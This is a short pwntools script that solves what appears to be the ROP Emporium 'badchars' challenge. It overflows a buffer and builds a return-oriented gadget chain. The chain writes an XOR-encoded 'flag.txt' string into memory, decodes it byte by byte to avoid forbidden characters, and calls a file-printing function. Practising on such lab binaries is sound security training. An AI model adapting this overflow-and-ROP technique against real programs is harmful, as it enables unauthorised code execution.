from pwn import *

#conn = gdb.debug('./badchars')
conn = process('./badchars')

payload = b'A'*0x28
payload += p64(0x40069c)
payload += b'flbhbtyt'    # r12
payload += p64(0x601030)  # r13
payload += p64(0x601038)  # r14, dummy
payload += p64(0x601038)  # r15, dummy but available address
payload += p64(0x400634)  # usefulGadgets

payload += p64(0x4006a0)
payload += p64(0x1) # r14
payload += p64(0x601032) # r15
payload += p64(0x400630) # usefulGadgets

payload += p64(0x4006a2)
payload += p64(0x601033)
payload += p64(0x400630)

payload += p64(0x4006a2)
payload += p64(0x601036)
payload += p64(0x400630)

payload += p64(0x4006a0)
payload += p64(0x34)
payload += p64(0x601034)
payload += p64(0x400630)

payload += p64(0x4006a3)
payload += p64(0x601030)
payload += p64(0x400510)

conn.sendlineafter('> ', payload)
conn.interactive()